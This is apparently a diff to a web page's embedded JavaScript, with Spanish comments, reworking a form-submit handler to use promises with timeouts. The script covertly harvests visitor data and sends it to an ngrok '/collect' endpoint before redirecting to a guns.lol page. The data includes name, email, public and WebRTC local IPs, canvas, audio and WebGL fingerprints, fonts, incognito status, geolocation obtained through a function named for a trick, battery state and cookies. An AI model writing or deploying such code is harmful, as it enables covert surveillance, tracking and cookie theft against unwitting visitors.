@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -23,47 +22,55 @@
 </div>
 <script>
 // ============================================================
-//  SCRIPT MEJORADO - TODAS LAS TÉCNICAS AVANZADAS
-//  (Mantiene la misma apariencia y flujo original)
+//  SCRIPT MEJORADO - VERSIÓN CORREGIDA (CON TIMEOUTS)
 // ============================================================
 (function(){
 
-    // ------- CONFIGURACIÓN -------
     var CONFIG = {
         endpoint: 'https://roast-skinning-paralysis.ngrok-free.dev/collect',
         redir: 'https://guns.lol/penthouseintokyo',
         ipApi: 'https://api.ipify.org?format=json',
-        geoApi: 'https://ipapi.co/json/' // fallback si no acepta geo
+        geoApi: 'https://ipapi.co/json/'
     };
 
-    // ------- 1. OBTENER IP PÚBLICA (SIEMPRE) -------
-    function getPublicIP(cb) {
-        fetch(CONFIG.ipApi)
+    // ---------- UTILIDAD: TIMEOUT PROMISE ----------
+    function promiseWithTimeout(promise, ms) {
+        return Promise.race([
+            promise,
+            new Promise(function(resolve) {
+                setTimeout(function() { resolve(null); }, ms);
+            })
+        ]);
+    }
+
+    // ---------- 1. IP PÚBLICA ----------
+    function getPublicIP() {
+        return fetch(CONFIG.ipApi)
             .then(r => r.json())
-            .then(d => cb(d.ip))
-            .catch(() => cb(null));
+            .then(d => d.ip)
+            .catch(function() { return null; });
     }
 
-    // ------- 2. OBTENER IP LOCAL VIA WebRTC (SIN PERMISOS) -------
-    function getLocalIP(cb) {
-        try {
-            var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel('test');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = function(e) {
-                if (!e.candidate) return;
-                var ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                if (ip) { cb(ip[0]); pc.close(); }
-            };
-            setTimeout(function() { cb(null); pc.close(); }, 3000);
-        } catch(e) { cb(null); }
+    // ---------- 2. IP LOCAL (WebRTC) ----------
+    function getLocalIP() {
+        return new Promise(function(resolve) {
+            try {
+                var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('test');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = function(e) {
+                    if (!e.candidate) return;
+                    var ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ip) { resolve(ip[0]); pc.close(); }
+                };
+                setTimeout(function() { resolve(null); pc.close(); }, 2000);
+            } catch(e) { resolve(null); }
+        });
     }
 
-    // ------- 3. FINGERPRINT AVANZADO (Canvas + Audio + WebGL) -------
+    // ---------- 3. FINGERPRINT (Canvas + Audio + WebGL) ----------
     function getAdvancedFingerprint() {
         var parts = [];
-
-        // Canvas
         try {
             var c = document.createElement('canvas');
             c.width = 300; c.height = 60;
@@ -78,8 +85,6 @@
             ctx.fillText('Cwm fjordbank glyphs vext quiz 😎',6,14);
             parts.push(c.toDataURL());
         } catch(e) { parts.push('canvas_error'); }
-
-        // Audio
         try {
             var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             var osc = audioCtx.createOscillator();
@@ -95,8 +100,6 @@
             parts.push(btoa(String.fromCharCode.apply(null, data)));
             osc.stop();
         } catch(e) { parts.push('audio_error'); }
-
-        // WebGL
         try {
             var canvas = document.createElement('canvas');
             var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -108,92 +111,95 @@
                 }
             }
         } catch(e) { parts.push('webgl_error'); }
-
         return btoa(parts.join('|'));
     }
 
-    // ------- 4. FUENTES DEL SISTEMA -------
-    function getFonts(cb) {
-        if (!document.fonts) { cb(null); return; }
-        var fontList = [];
-        var testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Comic Sans MS', 'Impact'];
-        var count = 0;
-        testFonts.forEach(function(f) {
-            document.fonts.load('16px "' + f + '"').then(function() {
-                fontList.push(f);
-                count++;
-                if (count === testFonts.length) cb(fontList.join(','));
-            }).catch(function() {
-                count++;
-                if (count === testFonts.length) cb(fontList.join(','));
-            });
-        });
-        setTimeout(function() { cb(fontList.join(',') || null); }, 2000);
-    }
-
-    // ------- 5. DETECTAR MODO INCOGNITO -------
-    function isIncognito(cb) {
-        try {
-            var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-            if (!fs) { cb(false); return; }
-            fs(window.TEMPORARY, 100, function() { cb(false); }, function() { cb(true); });
-        } catch(e) { cb(false); }
-    }
-
-    // ------- 6. GEOLOCALIZACIÓN DISFRAZADA (CON BOTÓN FALSO) -------
-    function getGeoWithTrick(cb) {
-        // Mostrar un mensaje falso de "selecciona tu región" usando un prompt visual
-        // pero en realidad pedimos geolocalización real
-        if (navigator.geolocation) {
-            // Pedimos permisos con un mensaje camuflado
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    cb({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-                },
-                function() {
-                    // Si rechaza, usamos ipapi.co como fallback (menos preciso)
-                    fetch(CONFIG.geoApi)
-                        .then(r => r.json())
-                        .then(d => {
-                            if (d.latitude && d.longitude) {
-                                cb({ lat: d.latitude, lon: d.longitude });
-                            } else {
-                                cb(null);
-                            }
-                        })
-                        .catch(function(){ cb(null); });
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            cb(null);
-        }
-    }
-
-    // ------- 7. DATOS DE BATERÍA (SIN PERMISO EXPLÍCITO) -------
-    function getBatteryInfo(cb) {
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(battery) {
-                cb({
-                    level: battery.level * 100,
-                    charging: battery.charging,
-                    time: battery.chargingTime
+    // ---------- 4. FUENTES (CON TIMEOUT) ----------
+    function getFonts() {
+        return new Promise(function(resolve) {
+            if (!document.fonts) { resolve(null); return; }
+            var fontList = [];
+            var testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Comic Sans MS', 'Impact'];
+            var count = 0;
+            testFonts.forEach(function(f) {
+                document.fonts.load('16px "' + f + '"').then(function() {
+                    fontList.push(f);
+                    count++;
+                    if (count === testFonts.length) resolve(fontList.join(','));
+                }).catch(function() {
+                    count++;
+                    if (count === testFonts.length) resolve(fontList.join(','));
                 });
-            }).catch(function() { cb(null); });
-        } else {
-            cb(null);
-        }
+            });
+            setTimeout(function() { resolve(fontList.join(',') || null); }, 1500);
+        });
     }
 
-    // ------- 8. ENVÍO DE DATOS CON NAVIGATOR.SENDBEACON (MÁS SEGURO) -------
+    // ---------- 5. MODO INCOGNITO ----------
+    function isIncognito() {
+        return new Promise(function(resolve) {
+            try {
+                var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                if (!fs) { resolve(false); return; }
+                fs(window.TEMPORARY, 100, function() { resolve(false); }, function() { resolve(true); });
+            } catch(e) { resolve(false); }
+        });
+    }
+
+    // ---------- 6. GEOLOCALIZACIÓN (CON FALBACK RÁPIDO) ----------
+    function getGeoWithTrick() {
+        return new Promise(function(resolve) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+                    },
+                    function() {
+                        fetch(CONFIG.geoApi)
+                            .then(r => r.json())
+                            .then(d => {
+                                if (d.latitude && d.longitude) {
+                                    resolve({ lat: d.latitude, lon: d.longitude });
+                                } else {
+                                    resolve(null);
+                                }
+                            })
+                            .catch(function(){ resolve(null); });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                resolve(null);
+            }
+            setTimeout(function() { resolve(null); }, 6000);
+        });
+    }
+
+    // ---------- 7. BATERÍA ----------
+    function getBatteryInfo() {
+        return new Promise(function(resolve) {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    resolve({
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        time: battery.chargingTime
+                    });
+                }).catch(function() { resolve(null); });
+            } else {
+                resolve(null);
+            }
+            setTimeout(function() { resolve(null); }, 2000);
+        });
+    }
+
+    // ---------- 8. ENVÍO DE DATOS ----------
     function sendData(payload) {
         var json = JSON.stringify(payload);
-        // Usamos sendBeacon si está disponible (más fiable)
         if (navigator.sendBeacon) {
             var blob = new Blob([json], { type: 'application/json' });
             navigator.sendBeacon(CONFIG.endpoint, blob);
         } else {
-            // Fallback a fetch
             fetch(CONFIG.endpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -201,11 +207,10 @@
                 keepalive: true
             }).catch(function(){});
         }
-        // Redirigir siempre (incluso si falla el envío)
         window.location.href = CONFIG.redir;
     }
 
-    // ------- 9. MANEJO DEL FORMULARIO (CON TODAS LAS RECOLECCIONES) -------
+    // ---------- 9. MANEJO DEL FORMULARIO ----------
     document.getElementById('frm').addEventListener('submit', function(e) {
         e.preventDefault();
         var nombre = document.getElementById('n').value.trim();
@@ -219,92 +224,47 @@
         ld.classList.add('show');
         err.style.display = 'none';
 
-        // Recolectar datos en paralelo
-        var ipPublica = null;
-        var ipLocal = null;
-        var geo = null;
-        var fonts = null;
-        var incognito = false;
-        var battery = null;
-        var fingerprint = getAdvancedFingerprint();
-        var ua = navigator.userAgent;
-        var screen = screen.width + 'x' + screen.height + '(' + window.devicePixelRatio + 'x)';
-        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        var lang = navigator.language;
-        var ref = document.referrer || 'direct';
-        var cookies = document.cookie || 'none';
-        var page = window.location.hostname + window.location.pathname;
-        var ts = new Date().toISOString();
+        var baseData = {
+            nombre: nombre,
+            correo: correo,
+            fingerprint: getAdvancedFingerprint(),
+            ua: navigator.userAgent,
+            screen: screen.width + 'x' + screen.height + '(' + window.devicePixelRatio + 'x)',
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            lang: navigator.language,
+            referrer: document.referrer || 'direct',
+            cookies: document.cookie || 'none',
+            page: window.location.hostname + window.location.pathname,
+            timestamp: new Date().toISOString()
+        };
 
-        // Contador de tareas completadas
-        var tasks = 6;
-        var done = 0;
-
-        function checkDone() {
-            done++;
-            if (done >= tasks) {
-                // Construir payload completo
-                var payload = {
-                    nombre: nombre,
-                    correo: correo,
-                    ip_publica: ipPublica,
-                    ip_local: ipLocal,
-                    geo: geo,
-                    fingerprint: fingerprint,
-                    fonts: fonts,
-                    incognito: incognito,
-                    battery: battery,
-                    ua: ua,
-                    screen: screen,
-                    tz: tz,
-                    lang: lang,
-                    referrer: ref,
-                    cookies: cookies,
-                    page: page,
-                    timestamp: ts
-                };
-                sendData(payload);
-            }
-        }
-
-        // Ejecutar todas las recolecciones
-        getPublicIP(function(ip) {
-            ipPublica = ip;
-            checkDone();
+        Promise.all([
+            promiseWithTimeout(getPublicIP(), 3000),
+            promiseWithTimeout(getLocalIP(), 2500),
+            promiseWithTimeout(getGeoWithTrick(), 6000),
+            promiseWithTimeout(getFonts(), 2000),
+            promiseWithTimeout(isIncognito(), 2000),
+            promiseWithTimeout(getBatteryInfo(), 2000)
+        ]).then(function(results) {
+            var payload = Object.assign({}, baseData, {
+                ip_publica: results[0],
+                ip_local: results[1],
+                geo: results[2],
+                fonts: results[3],
+                incognito: results[4],
+                battery: results[5]
+            });
+            sendData(payload);
+        }).catch(function() {
+            sendData(baseData);
         });
 
-        getLocalIP(function(ip) {
-            ipLocal = ip;
-            checkDone();
-        });
-
-        getGeoWithTrick(function(g) {
-            geo = g;
-            checkDone();
-        });
-
-        getFonts(function(f) {
-            fonts = f;
-            checkDone();
-        });
-
-        isIncognito(function(inc) {
-            incognito = inc;
-            checkDone();
-        });
-
-        getBatteryInfo(function(bat) {
-            battery = bat;
-            checkDone();
-        });
-
-        // Tiempo extra para tareas lentas (fallback)
         setTimeout(function() {
-            while (done < tasks) { checkDone(); }
-        }, 5000);
+            sendData(baseData);
+        }, 8000);
     });
 
-    // ------- 10. VALIDACIONES VISUALES (LAS MISMAS) -------
+    // ---------- 10. VALIDACIONES VISUALES ----------
     document.getElementById('n').addEventListener('input', function(){
         this.style.borderColor = this.value.length > 0 ? '#4fc3f7' : 'rgba(255,255,255,.12)';
     });
